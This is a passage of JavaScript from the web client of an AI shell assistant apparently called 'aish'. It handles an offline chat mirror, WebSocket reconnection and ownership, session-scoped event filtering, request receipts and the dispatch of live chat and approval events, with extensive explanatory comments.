  text.className = "loading-view-text";
  text.textContent = "Loading this chat…";
  row.append(spin, text);
  messagesEl.appendChild(row);
  scrollToEnd(true);
}

function markPendingViewStalled() {
  const row = messagesEl.querySelector(".loading-view");
  if (!row) return;
  row.querySelector(".spin")?.remove();
  row.querySelector(".loading-view-text").textContent =
    "Still loading — the connection may have stalled.";
  const retry = document.createElement("button");
  retry.type = "button";
  retry.className = "loading-view-retry";
  retry.textContent = "Reconnect";
  retry.onclick = () => { retry.remove(); reconnect(); };
  row.appendChild(retry);
}

// The mirror read is async, so the server can win the race while IndexedDB is
// still reading — and a cached copy must never overpaint an authoritative one.
// `awaitingPaint` IS that guard: onReplay clears it, so a paint that already
// happened silently cancels this one.
async function paintFromMirror(name) {
  const cached = await offlineLoad(name);
  if (!cached || awaitingPaint !== name) return;
  // Re-enter as `mirror` so the paint claims no fingerprint (#202): these events
  // came out of IndexedDB, capped and possibly in an older event shape, so the
  // replay that follows must rebuild over them rather than land "noop".
  enterSession(name, { source: "mirror", title: cached.meta.title || knownTitle(name) });
  onReplay({ events: cached.events, truncated: false });
}

// The chat we were waiting for cannot be painted at all. Leaving the spinner up
// would promise a transcript that is never coming.
function abandonPendingView(reason) {
  paintLanded();
  messagesEl.replaceChildren();
  addMsg("notice", reason);
}
// [PENDING-VIEW-END]

// The best title we already hold for a chat we are about to enter, so a warm
// paint doesn't flash the wrong name in the header. `undefined` leaves the
// header alone, which is what enterSession expects when nothing is known.
function knownTitle(name) {
  const known = recentSessions.find((s) => s.name === name);
  if (known && known.title) return known.title;
  const meta = offlineMeta.get(name);
  return (meta && meta.title) || undefined;
}

// First paint. Runs before connect() so the last chat is on screen while the
// socket is still opening — the same code path that made this cheap offline is
// what makes it fast online. A server hello/replay overwrites it moments later.
async function offlineFirstPaint() {
  try {
    // Nothing to pre-paint when a fresh chat was asked for ([OPEN-NEW]): the
    // last conversation would flash up and be replaced a moment later.
    if (openNewOnLoad) return;
    const urlSession = new URLSearchParams(location.search).get("session");
    const remembered = storeSession(urlSession) || localStorage.getItem("aish-session");
    let cached = remembered ? await offlineLoad(remembered) : null;
    if (!cached) {
      // The remembered chat can legitimately be missing from the mirror: an
      // EMPTY new chat is never mirrored (the server's own listing skips it),
      // and that is exactly what you leave behind by opening the app and not
      // typing. Landing on a blank screen with no chat to swipe from would
      // make the whole offline archive unreachable, so fall back to the newest
      // chat there IS.
      const metas = await offlineList();
      const newest = metas.sort((a, b) => (b.ts || 0) - (a.ts || 0))[0];
      if (newest) cached = await offlineLoad(newest.name);
    }
    // The socket won the race — the authoritative transcript is already up.
    if (!cached || serverPainted) return;
    // Short grace so a fast (LAN) replay wins OUTRIGHT: painting the mirror
    // first meant rendering the whole chat twice back to back, with the
    // authoritative paint queued behind the cached one — the app filled
    // SLOWER at home, where the mirror is least needed. On a slow link the
    // replay misses the window and the cached paint proceeds barely delayed,
    // which is the case the mirror exists for.
    await new Promise((resolve) => setTimeout(resolve, FIRST_PAINT_GRACE_MS));
    if (serverPainted) return;
    // The owner anchors the pager, the reconnect and the mirror's bookkeeping
    // to what is actually on screen — this path used to do only half of it.
    enterSession(cached.meta.name, { source: "boot", title: cached.meta.title || "aish" });
    onReplay({ events: cached.events, truncated: false });
    hideBootLoader(); // the mirror painted before the socket — drop the spinner now
  } catch { /* no mirror yet — the socket will fill the page in */ }
}

// ---- offline: pinning ("Available offline") -----------------------------
// [OFFLINE-PIN-STATE-START]
// The pin lives in IndexedDB, and that is the ONLY place anything may read it
// from. Reading it off the in-memory `offlineMeta` mirror instead was the "my
// pin got reset" bug: that map is empty for a moment after every reload (it is
// filled by an async refresh), so a pinned chat's menu showed "Off" — and
// tapping the item to "pin" it read the real state and flipped it, silently
// UNPINNING the chat the user was trying to protect. A label that can lie about
// a toggle's state is worse than a slow one, so this is always a real read.
async function offlineIsPinned(name) {
  if (!name) return false;
  const meta = await offlineSafe(idbGet("meta", name));
  return Boolean(meta && meta.pinned);
}
// [OFFLINE-PIN-STATE-END]

// The chat menu's Pin row, always from a real read. It shows "…" until the
// store answers, because a toggle that states the wrong value invites a tap
// that does the opposite of what you wanted — which is exactly how pinned chats
// were getting silently unpinned.
//
// It lives in the menu rather than the title bar: pinning is a per-chat setting
// you touch rarely, and the title row is the scarcest space in the app.
async function refreshOfflinePinUi() {
  const state = $("pin-state");
  if (!state) return;
  const name = currentSession;
  state.textContent = "…";
  let pinned;
  try {
    pinned = await offlineIsPinned(name);
  } catch {
    return; // stays "…": we genuinely don't know
  }
  if (name !== currentSession) return; // switched chats mid-read
  state.textContent = pinned ? "On" : "Off";
  $("menu-pin").classList.toggle("on", Boolean(pinned)); // the glyph is the signal
}

async function toggleOfflinePin() {
  if (!currentSession) { showToast("no chat to pin yet"); return; }
  const meta = (await offlineSafe(idbGet("meta", currentSession))) || null;
  if (!meta) {
    // Not mirrored yet (a brand-new chat, or a sync that hasn't reached it):
    // fetch it now so "available offline" is true the moment it is promised.
    try {
      await offlineFetchSession(currentSession, null);
    } catch {
      showToast("can't save this chat offline right now");
      return;
    }
  }
  const current = (await offlineSafe(idbGet("meta", currentSession))) || null;
  if (!current) { showToast("offline storage unavailable"); return; }
  current.pinned = !current.pinned;
  await idbPut("meta", current);
  offlineMeta.set(currentSession, current);
  refreshOfflinePinUi(); // reflect the new state on the toggle immediately
  showToast(current.pinned ? "pinned — kept at the top and offline" : "unpinned");
}

// There is deliberately no "clear offline copies" action. The mirror manages
// itself — capped, least-useful-first eviction, deleted chats dropped on the
// next sync — so clearing was a control for a problem that doesn't arise, and
// it also dropped the cached app shell, breaking "the app always opens offline"
// until the next successful load. Disposal and repair are both covered by
// deleting the installed app (or the browser's own clear-website-data).

// ---- websocket lifecycle -------------------------------------------------
let ws = null;
let backoff = 1000;
let reconnectTimer = null;
// A transient drop usually reconnects in well under a second, so we don't flash
// the red dot + "reconnecting" bar the instant the socket closes — we arm a
// short grace timer and only surface the warning if the outage outlives it. A
// successful onopen clears it, so a quick blip is never shown to the user (#129).
let connWarnTimer = null;
const CONN_WARN_DELAY = 2000;

// [RETIRE-START]
// The socket has ONE owner: the `ws` variable. connect() is reached from several
// places (initial load, the onclose backoff timer, reconnect(), a foregrounding
// phone) and each assigns a fresh socket to `ws` — but assigning the variable
// does NOT dispose the socket it replaced. An orphaned socket left OPEN keeps its
// onmessage handler alive and goes on delivering live events into handle(), so
// every user bubble and every timeline step renders once PER surviving socket
// (replay is immune — it replaceChildren()s — which is why only the live
// "working" state doubled). Neutralize the predecessor before it can double-feed:
// null its handlers so no stray onclose reschedules another connect, then close
// it. Idempotent and safe on a CONNECTING/CLOSING/CLOSED socket.
function retireSocket(sock) {
  if (!sock) return;
  sock.onmessage = null;
  sock.onopen = null;
  sock.onclose = null;
  sock.onerror = null;
  try { sock.close(); } catch { /* already closing/closed */ }
}
// [RETIRE-END]

// [SESSION-FIREWALL-START]
// Live deliveries are session-gated (#182). The bridge stamps every event it
// fans out with its session's name; an event naming a session other than the
// one on screen is dropped at the socket, BEFORE the dispatcher. This is the
// firewall the client-side switch window needs: a prefetched swipe (and an
// offline-mirror tap that later reconnects) moves `currentSession` before the
// server has processed the resume, and until the server moves this viewer
// between bridges the OLD session's live tail keeps arriving — its `done`
// used to render a bubble into the NEW chat's view. phase 3's answerAbandoned
// only covers one turn's leftovers; this gates every delivery.
//
// Unstamped events (client-direct messages: session_list, peek,
// errors, console_*) always pass — no `session` field means "not scoped".
// Cross-session BY DESIGN, and exempt:
//   hello           — the switch mechanism itself; it MOVES currentSession
//   session_changed — the roster plane (#204): a row about ANY chat, for every
//                     client whatever it is viewing. That this list kept
//                     growing one carve-out at a time is what said the roster
//                     needed its own channel rather than more exemptions
//   session_deleted — same, and dropping it strands a chat that is gone
//   session_state   — the roster plane's predecessor, kept for an old server
// session_renamed is exempt too: its handler is by-name and idempotent, and
// dropping it in the switch window would just desync a drawer/pager label.
// Replayed events never reach this gate (the replay loop feeds handle()
// directly) and carry no stamp anyway: the bridge stamps only the live
// delivery, keeping the recorded transcript byte-identical to a cold
// reconstruct_events replay.
const SESSION_CROSS_EVENTS = new Set([
  "hello", "session_changed", "session_deleted", "session_state", "session_renamed",
]);

function foreignSessionEvent(event, current) {
  if (!event.session || SESSION_CROSS_EVENTS.has(event.type)) return false;
  return event.session !== current;
}
// [SESSION-FIREWALL-END]

// [CONNECT-WIRE-START]
// The other half of the socket's ownership (see [RETIRE] above): this is the
// ONLY place that assigns `ws`. Fenced whole rather than just the wiring
// statements because a choreography test has to CALL it — the interleavings
// that produced #179 (a second connect over a live socket, a reconnect over a
// zombie, an out-of-order onclose) are only reachable by replacing a socket for
// real, not by re-reading the assignments. tests/js/test_choreo_socket_replace.js
// runs this function against a controllable fake WebSocket; test_ownership.js
// enforces that no third writer of `ws` appears outside this block.
function connect() {
  clearTimeout(reconnectTimer);
  // Exactly one live feed into handle(): drop whatever socket `ws` still points
  // at (a zombie, a slow CONNECTING attempt, a dead one an onclose hasn't
  // reported yet) before we overwrite the variable and lose the reference.
  retireSocket(ws);
  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  const params = new URLSearchParams();
  if (token) params.set("token", token);
  // Name the session this device was on: after a server restart the active
  // session is a fresh empty chat, and without this every reconnect (and
  // every rev-mismatch reload) would silently move the user there.
  // A shared/deep link names the session (?session=<public id>); it wins on
  // load, else resume the last session this device was on. Map the public id
  // back to the store name for the server.
  const urlSession = new URLSearchParams(location.search).get("session");
  // `?new` ([OPEN-NEW]) names no session at all: we are about to ask for a
  // fresh one, and landing on the old chat first only to leave it reads as a
  // glitch.
  const lastSession = openNewOnLoad
    ? null
    : urlSession || localStorage.getItem("aish-session");
  if (lastSession) params.set("session", storeSession(lastSession));
  const query = params.size ? `?${params}` : "";
  ws = new WebSocket(`${proto}//${location.host}${BASE}ws${query}`);
  ws.onopen = () => {
    backoff = 1000;
    clearTimeout(connWarnTimer); // reconnected within the grace window — no warning
    connWarnTimer = null;
    $("connbar").hidden = true;
    connOk = true;
    updateDot();
    setOfflineMode(false);
    offlineSyncSoon(); // catch the mirror up on whatever happened while away
    checkAppVersion(); // server restarts are when the UI code changes
    if (openNewOnLoad) {
      // Cleared BEFORE the send, not after: this runs again on every
      // reconnect, and a flag still set there would open a chat each time the
      // phone woke up ([OPEN-NEW]).
      openNewOnLoad = false;
      act({ type: "new" }, { label: "the new chat" });
    }
  };
  ws.onmessage = (raw) => {
    const event = JSON.parse(raw.data);
    // Session firewall (#182, see [SESSION-FIREWALL]): a delivery for a chat
    // that is not on screen never reaches the dispatcher. Checked before the
    // dirty mark — a foreign event touches nothing in THIS view, and the
    // foreign session's own next replay accounts for it by fingerprint.
    if (foreignSessionEvent(event, currentSession)) return;
    // A live transcript-affecting event invalidates the rendered-view stash
    // (see [VIEWCACHE]). Marked HERE, not in handle(): the replay loop also
    // funnels through handle(), and replayed events are exactly what the
    // fingerprint already accounts for.
    if (!VIEW_SAFE_EVENTS.has(event.type)) viewDirty = true;
    handle(event);
  };
  ws.onclose = (event) => {
    // The socket that carried them is gone, so nothing will ever come back to
    // say whether they arrived. [PENDING-SEND] hands the text back to the
    // composer rather than leave a bubble claiming to be "Sending…" over a dead
    // connection. (A deliberate replacement nulls this handler in retireSocket,
    // so a reconnect we CHOSE never triggers it.)
    clearPendingSends();
    if (event.code === 4000) {
      connOk = false;
      updateDot();
      showToast("another device connected — this tab is detached");
      return; // deliberate replacement: do not fight over the session
    }
    if (event.code === 4403) {
      // In-app entry: iOS home-screen apps launch without query params and
      // have storage isolated from Safari, so the URL trick can't help there.
      connOk = false;
      updateDot();
      if (token) showToast("that token was rejected — check for typos");
      hideBootLoader(); // reveal the token form instead of a spinner over it
      $("token-gate").hidden = false;
      $("token-input").focus();
      return;
    }
    // Transient drop: defer the red dot + "reconnecting" bar past a grace window
    // so a sub-second blip stays invisible (#129). Arm once — don't reset it on
    // each failed retry, or a sustained outage would never surface.
    // …and once the offline bar has taken over, don't re-arm: every failed
    // retry would otherwise flash "reconnecting…" back on for an instant.
    if (connWarnTimer === null && $("connbar").hidden && !offlineMode) {
      connWarnTimer = setTimeout(() => {
        connWarnTimer = null;
        connOk = false;
        updateDot();
        $("connbar").hidden = false;
        // The socket has been down long enough to call it: switch the UI to
        // read-from-the-mirror mode. Retries continue underneath, and the first
        // successful onopen clears it.
        setOfflineMode(true);
      }, CONN_WARN_DELAY);
    }
    reconnectTimer = setTimeout(connect, backoff);
    backoff = Math.min(backoff * 2, 10000);
  };
}
// [CONNECT-WIRE-END]

// Manual nudge (#18): standalone PWA mode has no browser chrome to refresh
// from, so a stalled connection otherwise strands the user until they
// force-quit. A socket can also look OPEN to the browser long after the
// underlying connection actually died (e.g. the phone slept through a
// network change) — drop whatever we have unconditionally and retry now
// instead of waiting out the backoff ladder.
function reconnect() {
  clearTimeout(reconnectTimer);
  backoff = 1000;
  connOk = false;
  updateDot();
  // connect() now retires the previous socket itself (see retireSocket), so the
  // old hand-rolled teardown here is redundant — but keep the deliberate reset
  // of backoff/dot above; the socket disposal belongs to connect().
  connect();
}

// New chat over a socket that already knows it's dead (CLOSING/CLOSED/
// CONNECTING) would otherwise just toast "not connected" and go nowhere —
// reconnect first and ask for the fresh chat once the new socket is up. A
// "zombie" socket (readyState still OPEN, dead underneath) isn't detectable
// here; the manual Reconnect control covers that case (#18).
function requestNewChat() {
  if (!ws || ws.readyState !== WebSocket.OPEN) {
    reconnect();
    ws.addEventListener("open", () => act({ type: "new" }, { label: "the new chat" }), { once: true });
    return;
  }
  act({ type: "new" }, { label: "the new chat" });
}

let appVersion = null;

async function checkAppVersion() {
  // A long-lived tab/PWA keeps running old JS across server upgrades and
  // silently speaks an outdated protocol. Compare the served app.js
  // fingerprint on every (re)connect; reload when it changed — the replay
  // mechanism restores the full view afterwards.
  try {
    const response = await fetch("app.js", { method: "HEAD", cache: "no-store" });
    const tag = response.headers.get("etag") || response.headers.get("last-modified");
    if (!tag) return;
    if (appVersion === null) {
      appVersion = tag;
    } else if (tag !== appVersion) {
      showToast("aish-web updated — reloading");
      setTimeout(() => reloadThrottled("asset"), 1000);
    }
  } catch { /* offline blip; next reconnect checks again */ }
}

function send(message) {
  if (!ws || ws.readyState !== WebSocket.OPEN) {
    // Offline is read-only by design (see the offline mirror notes above), so
    // say which it is: a blip worth retrying, or a state the user should stop
    // fighting. Composer drafts are already preserved either way.
    showToast(offlineMode ? "offline — you can read past chats, not send" : "not connected");
    return false;
  }
  ws.send(JSON.stringify(message));
  return true;
}

// [ACK-LEDGER-START]
// HANDING A REQUEST TO THE SOCKET IS NOT THE SAME AS IT HAPPENING, and in a
// PWA that is not pedantry: the socket can report OPEN long after it died,
// accepting everything and answering nothing, which is what a phone has after
// a sleep. `send()` returning true means "the browser took the bytes" and
// nothing more.
//
// The client used to treat it as "done" everywhere, and the UI said so — the
// approval card greyed out, the queue chip vanished, the header said
// "Stopping…", the title changed. Every one of those was a claim about the
// SERVER made on the strength of a local function call, and when the socket
// was a zombie every one of them was false: the gate stayed parked holding a
// command, the message you cancelled ran anyway, the task went on. A delete
// was how it surfaced (#210) — the log file was still there hours later.
//
// So: an ACT is a request that changes something over there, and it is
// outstanding until the server RECEIPTS it. The receipt is generic — the
// server stamps one for any message carrying a `rid`, at the dispatch point
// rather than in each handler, so no request type can be forgotten and a new
// one is covered before anyone thinks about it. It says "handled", never
// "succeeded"; what happened is carried by the events each feature already
// emits, and those still drive the UI.
//
// What an act owes the user when it goes unreceipted is a `lost` callback:
// UNDO WHATEVER THE UI CLAIMED. A claim that cannot be undone must not be
// made in the first place — that is the whole discipline, and it is why the
// call sites below hand over their own repair rather than this block guessing.
//
// Deliberately NOT here: retrying. The request may well have arrived and had
// its receipt die on the way back, so "unreceipted" means UNCONFIRMED, not
// "did not happen" — the wording says so, and every act is one the user can
// simply do again. Automatically re-issuing an approval, a stop or a delete
// on a guess is a worse failure than the one being fixed.
//
// Reads (`sessions`, `files`, `models`, `jobs`, `peek`) are deliberately not
// acts: a lost query paints nothing and asking again is free, so receipting
// them would buy a toast nobody needs.
const ACK_MS = 8000;         // how long a receipt may take before we speak up
const ACK_SWEEP_MS = 1000;   // granularity of the check — one timer, not N
let ackSeq = 0;
const outstanding = new Map(); // rid -> { label, due, lost }
let ackTimer = null;

// Send a state-changing request and hold it open until the server receipts it.
// `label` names the ACTION in the user's words ("the approval", "cancelling
// that message") — it is what they read if it goes missing. `lost` undoes
// whatever the UI claimed; omit it only when the UI claimed nothing.
function act(message, { label, lost } = {}) {
  const rid = `r${++ackSeq}`;
  if (!send({ ...message, rid })) {
    // Never even handed over. Say which action failed, not just that the
    // socket is down — the user asked for a THING, and `send`'s own notice
    // names the connection instead.
    if (label) showToast(`${label} didn't happen — ${offlineMode ? "you are offline" : "not connected"}`);
    if (lost) lost();
    return false;
  }
  outstanding.set(rid, { label, due: Date.now() + ACK_MS, lost });
  armAckSweep();
  return true;
}

function onAck(rid) {
  outstanding.delete(rid);
  if (!outstanding.size) { clearTimeout(ackTimer); ackTimer = null; }
}

function armAckSweep() {
  if (ackTimer) return;
  ackTimer = setTimeout(sweepAcks, ACK_SWEEP_MS);
}

// One sweep for all of them: a dead socket strands everything at once, and N
// toasts stomping each other in a single toast slot would tell the user less
// than one honest sentence.
function sweepAcks() {
  ackTimer = null;
  const now = Date.now();
  const lost = [];
  for (const [rid, item] of outstanding) {
    if (item.due > now) continue;
    outstanding.delete(rid);
    lost.push(item);
  }
  if (lost.length) {
    for (const item of lost) { if (item.lost) item.lost(); }
    const labels = lost.map((i) => i.label).filter(Boolean);
    const what = labels.length === 1 ? labels[0]
      : labels.length ? `${labels.length} actions` : "that";
    // "may not have" is the truth: the request could have arrived and had its
    // receipt die on the way back. Overstating it would teach the user to
    // distrust a message that is usually right.
    showToast(`${what} may not have reached aish — reconnecting`);
    reconnect(); // whatever it was, this socket is not carrying traffic
  }
  if (outstanding.size) armAckSweep();
}
// [ACK-LEDGER-END]

// [WAKE-START]
// Waking the app is the single most defect-dense moment in the client: the
// phone has been asleep, so deferred work never ran, and the socket may be dead
// without ever having said so. Two subsystems are reconciled here — the offline
// mirror and the connection — which is why this is a NAMED function registered
// rather than an anonymous listener: tests/js/test_choreo_wake.js drives it
// directly, and a listener you cannot call is a listener you cannot test.
// (The two other visibilitychange listeners in this file are unrelated — the
// viewport snap and the read-aloud wake lock — and are deliberately left alone;
// this is fencing, not refactoring for its own sake.)
function onPageWake() {
  if (document.hidden) {
    // Putting the app away is the moment the mirror matters: the sync loop
    // skips the on-screen chat while visible (it re-syncs every turn and the
    // user is looking at the live copy), so catch it up now — locking the
    // phone right after an answer still leaves that answer readable offline.
    // Called directly, not via offlineSyncSoon: a hidden page's timers may
    // never fire.
    offlineSyncOnce();
    return;
  }
  // Phone unlock: reconnect immediately instead of waiting out the backoff.
  if (!ws || ws.readyState === WebSocket.CLOSED) connect();
}
document.addEventListener("visibilitychange", onPageWake);
// [WAKE-END]

// ---- event dispatch ------------------------------------------------------
let answerEl = null; // the assistant block tokens append to
let answerText = "";
let sawAnswer = false; // any tokens streamed since the task started —
// echo lines close the answer block, so this (not answerText) decides
// whether done.result still needs rendering
// Streaming renders incrementally: blocks above the last committed blank
// line are stable DOM that is never rebuilt (so an embedded image decodes
// once, not once per token), and renders are coalesced to one per frame.
let answerStableLen = 0; // chars of answerText already in stable DOM
let answerStableNodes = 0; // answerEl children that are stable
let answerCardIds = new Set(); // videos carded in the stable prefix ([ONE-CARD])
let answerRenderQueued = false;
// This turn's answer was thrown away mid-stream by a replay (see resetLiveTurn):
// stale LIVE tokens for it are dropped, replayed ones re-open it. Rides with
// sawAnswer's turn boundaries — set only by the owner below, cleared by
// authoritative replayed content, by `done`, and by a LIVE `user` event (a
// replayed one is the rebuild of the abandoned turn itself, not a new one).
let answerAbandoned = false;
const cards = new Map(); // approval id -> card element

// [TURN-RESET-START]
// The live turn's render state — the bubble tokens stream into, its stable-prefix
// bookkeeping, the pending approval cards, and the open activity trace — is ONE
// cluster, so it gets ONE reset. It used to be zeroed by hand inside onReplay,
// which is reachable MID-STREAM from three paths that never asked whether a turn
// was running (the socket's own `replay`, an offline mirror tap, and the prefetch
// paint of a committed swipe), and that hand-rolled subset left two things out:
// the open trace was never closed, so a live one survived into the NEXT chat and
// collected its steps, and the half-streamed bubble was dropped while its tail
// kept arriving.
//
// `landing` is replayLanding's verdict, and the first thing this owns is that a
// "noop" landing resets NOTHING. "noop" means the DOM already IS this transcript
// — the reconnect re-replay after every phone unlock lands there, while a turn
// may genuinely still be running, and tearing that turn down would be the very
// bug this function exists to fix. Only a landing that REPLACES the transcript
// (reuse/rebuild) ends the live turn along with it.
function resetLiveTurn(landing) {
  if (landing === "noop") return;
  // A turn was streaming when this replay landed. The bubble goes with the DOM
  // that is about to be replaced, and the tail of the stream would paint a
  // TRUNCATED answer into a fresh one — and, by setting sawAnswer, suppress the
  // `done` render that carries the whole text. So abandon the answer: onToken
  // drops the stale LIVE tail, while REPLAYED tokens (this same replay usually
  // carries the partial answer — the server's transcript records them) are
  // authoritative and re-open the turn, rebuilding the bubble the live tail then
  // continues into. Worst case — a replay with no token for this turn — the
  // failure mode is "no live streaming until `done`", never a duplicated or
  // half-written answer.
  if (answerEl) answerAbandoned = true;
  answerEl = null;
  answerText = "";
  answerStableLen = 0;
  answerStableNodes = 0;
  answerCardIds = new Set();
  sawAnswer = false;
  cards.clear();
  pendingCards = 0;
  renderedAnswers = 0; // fork ordinals restart with the rebuilt transcript
  finishTrace(); // the open trace belongs to the turn whose DOM just went away
  // The clock goes with the turn. The replay about to run re-derives it from the
  // transcript it paints, so leaving the old value would let one chat's origin
  // date another chat's card — the case where the replayed transcript is trimmed
  // past its own opening user event and sets nothing at all.
  turnStart = 0;
}
// [TURN-RESET-END]

function handle(event) {
  switch (event.type) {
    case "hello": onHello(event); break;
    case "replay": serverPainted = true; onReplay(event); break;
    case "user":
      closeAnswer();
      finishTrace(); // close any trace from a prior turn before the new one
      removeQueueChip(event.text); // a queued message that just started running
      // The server's own version of this turn supersedes the bubble we drew on
      // send ([PENDING-SEND]) — it carries the stamp, the turn id and any
      // attachment notes, so it replaces rather than merely confirms.
      if (!replaying) resolvePendingSend(event.text);
      retireQuickReplies();
      // The rerun button belongs to the last ANSWER: attachAnswerTools retires
      // it when the next answer lands. Don't retire it here on the user turn —
      // user-only turns (/cd, a bare !command) produce no answer and would
      // otherwise strip the last answer's rerun for good (survives replay too).

      sawAnswer = false;
      // A LIVE user turn always streams afresh. A REPLAYED one is a
      // reconstruction, not a new turn — and it is exactly what the replay that
      // just abandoned a half-streamed answer rebuilds, so clearing the flag
      // here would hand the still-arriving tail a bubble of its own (#181).
      if (!replaying) answerAbandoned = false;
      userCmdBlock = null; // a new turn supersedes any dangling ! command block
      taskErrored = false; // a new turn clears the prior error's red dot
      // The turn's origin, for the answer's timing readout and the live trace
      // card's clock. A live turn starts now; a replayed one carries its real
      // start from the server (replayedTurnStart).
      turnStart = replaying ? replayedTurnStart(event) : Date.now();
      setBusy(true);
      // A synthetic turn is aish's own text (a resume note, an automation's
      // trigger prompt), so it must not seed the chat title or the composer's
      // prompt history — both are records of what YOU asked (#171).
      // Stripped first: a photo sent with no words would otherwise title the
      // chat with the note aish wrote to itself, path and all.
      if (!sessionTitled && event.synthetic !== "resume") {
        setTitle((stripAttachmentNotes(event.text) || event.text).split("\n")[0]);
      }
      if (!event.synthetic) rememberPrompt(stripAttachmentNotes(event.text));
      lastUserPrompt = stripAttachmentNotes(event.text); // for error Retry
      // A user-direct `!` command is already fully shown by the terminal block
      // that follows — its prompt line carries the command. The extra blue
      // user-input bubble duplicated that and, on a restored session, rendered
      // the raw (multi-line) command as if typed into chat (#154). So skip the
      // bubble for `!` commands; the turn-boundary handling above still runs.
      // A synthetic turn takes the system-note row for the same reason: only
      // the rendering differs, every turn side effect above still fires.
      turnAnchorEl = event.text.startsWith("!")
        ? null
        : event.synthetic
          ? addSystemMsg(event.synthetic, event.text)
          : addUserMsg(event.text, event.at, event.turn, event.files);
      // Your own message always comes into view, even if you were scrolled up.
      if (!replaying) scrollToEnd(true);
      break;
    case "queued":
      // The agent was busy, so this message waits its turn as a chip instead of
      // a transcript bubble — the other way a send is accounted for.
      resolvePendingSend(event.text);
      addQueueChip(event.text);
      break;
    case "dequeued": removeQueueChip(event.text); break;
    // The share inbox is server-owned and not per-chat: every repaint is the
    // full list, so a claim on the phone clears the chip on the laptop too.
    case "shared": renderShares(event.items || []); break;
    case "cwd_queued": addCwdChip(event.path); break;
    case "cwd_dequeued": removeCwdChip(); break;
    case "token": onToken(event.text); break;
    case "delivery": onDelivery(event); break;
    case "echo":
      // The activity trace already shows a run_command's approval + result and
      // its own Stop/Stopping state, so drop the approver's redundant
      // confirmation and the "stop requested" line while a trace is open.
      // `session-allowed` is the wording every log written before the chat
      // rename carries, and a replay must render as the live turn did (L2), so
      // both spellings are recognised — the server only ever emits the new one.
      if (currentTrace && /^[✓✕] (auto-approved|session-allowed|chat-allowed|always-allowed|blocked|stop requested)/.test(event.text)) break;
      closeAnswer();
      addAnsiMsg("echo", event.text);
      break;
    case "stream": traceStream(event.text); break;
    case "command_start": onCommandStart(event); break;
    case "command_end": onCommandEnd(event); break;
    case "step": traceStep(event); break;
    case "workspace": addWorkspaceNote(event.change, event.path); break;
    case "redacted": addRedactedMsg(); break;
    case "rating": markRating(event.turn, event.rating, event.comment); break;
    case "ack": onAck(event.rid); break;
    case "error":
      // [ERROR-KIND-START]
      // An `error` says one of two unrelated things, and everything below the
      // guards is written for exactly one of them: YOUR TURN FAILED. That ends
      // the turn — close the answer, close the live trace, clear busy, offer
      // Retry, push a notification.
      //
      // The other kind is a REFUSAL of the request you just made, and it says
      // nothing whatsoever about the turn. Running them through the same path
      // is what made refusing to delete a message while the chat was working
      // tear down the RUNNING turn's card — taking Stop and Retry with it, and
      // stranding a task with no way to reach it. The refusal was right; it
      // just also destroyed the thing it was protecting.
      //
      // Told apart by the machine-readable code, never the prose: the server
      // stamps `refused` at the site that knows (WebServer._refuse), because a
      // turn failure goes through the bridge and a refusal goes down one
      // socket — a distinction the far end cannot re-derive. A refusal is a
      // toast: transient feedback about an action, like every other refused
      // action in this app.
      if (event.code === "no_such_session") { onSessionGone(event.name || ""); break; }
      if (event.code) {
        // A refusal ends whatever it refused; the backfill control must not be
        // left saying "loading" when the server has already said no ([BACKFILL]).
        backfillFromBottom = -1;
        endBackfill();
        showToast(event.text);
        break;
      }
      // [ERROR-KIND-END]
      closeAnswer();
      finishTrace(true); // #48: a mid-turn error must close the live trace, not leave it stuck "Working…"
      turnStart = 0;
      addErrorMsg(event.text);
      // A live error means the current task failed → red dot. A REPLAYED error
      // (a past interrupted turn on a freshly-loaded session) must not: the
      // connection is fine, so keep the dot green and just show Retry.
      if (!replaying) taskErrored = true;
      setBusy(false);
      setStatus(null);
      notify("aish — task failed", event.text);
      break;
    case "stopped": onStopped(); break;
    case "status": onStatus(event); break;
    case "approval_request": onApprovalRequest(event); break;
    case "approval_resolved": onApprovalResolved(event); break;
    case "done":
      onDone(event);
      // A turn that finished while you were WATCHING it is read. Entering a
      // chat stamps the seen map ([SEEN]), but the turn keeps writing to the
      // log after that, so its last-activity ends up newer than the stamp and
      // every chat you had just used came back marked unread the moment you
      // left it — which would have made the attention band the whole list.
      if (!replaying) markSeen(currentSession);
      // A finished turn is what the mirror is missing — but syncing right
      // away competed with the user's next action for the main thread and the
      // server (the chat on screen re-parses on every pass, its mtime always
      // moves). A calm debounce covers the multi-turn case; putting the app
      // away is covered separately by the sync-on-hidden in visibilitychange.
      if (!replaying) offlineSyncSoon(OFFLINE_SYNC_AFTER_DONE_MS);
      break;
    case "history": onHistory(event.messages); break;
    case "session_list": renderSessions(event); break;
    case "model_list": renderModels(event); break;
    case "model_changed": onModelChanged(event); break;
    case "cwd_changed": renderWorkspace(event); break;
    case "job_list": $("ws-jobs").textContent = event.text || "—"; break;
    case "browser_view": onBrowserView(event); break;
    case "browser_watch": onBrowserWatch(event); break;
    case "file_list": onFileList(event); break;
    case "session_state": onSessionState(event); break;
    case "session_deleted": onSessionDeleted(event); break;
    case "session_changed": onSessionChanged(event); break;
    // The owner read a chat — here, or on the other device (#232).
    case "seen_marked": applySeenMarks(event.seen); break;
    case "seen_ledger": onSeenLedger(event); break;
    case "peek": onPeek(event); break;
    case "session_renamed": onSessionRenamed(event); break;
    case "role": onRole(event); break;
    case "console_started": onConsoleStarted(event); break;
    case "console_out": onConsoleOut(event.data); break;
    case "console_exit": onConsoleExit(event.code); break;
    case "console_shared": showToast("shared to context"); break;
    case "console_error": showToast(event.text); break;
  }
}

function onSessionRenamed(event) {
  // The header follows only when the renamed chat is the one on screen; the
  // drawer refreshes via the session_list the server sends right after.
  if (event.name === currentSession) setTitle(event.title);
  const known = recentSessions.find((s) => s.name === event.name);
  if (known) known.title = event.title;
}

// A chat you are NOT viewing changed state. Two kinds arrive here, and they are
// not the same news: `waiting` means it has stopped and cannot go on without
// you, `idle` that it finished on its own. Both belong in the count; only the
// second is worth a system notification, because an unattended hold already has
// its own push (`notify_hold`, server-side) and a hold you are around for is
// what the count and the toast are for.
// [ROSTER-START]
// The stream of "chat X is now …", for every chat, whatever this client is
// looking at (#204).
//
// It replaces a pull. The list of chats and what they were doing used to be
// refreshed only when this client ASKED — which it did on opening the rail —
// so between opens the roster decayed, and the four repairs before this one
// each widened when it re-asks rather than making the server tell it. What was
// never announced at all: a chat STARTING, an approval ANSWERED somewhere else
// (so a phone went on showing "Needs approval" for a card cleared on the
// laptop), and a chat renamed or deleted elsewhere.
//
// A row is applied whole and is idempotent, so a duplicate costs nothing and a
// missed one is repaired by the next row for that chat. `seq` is what turns
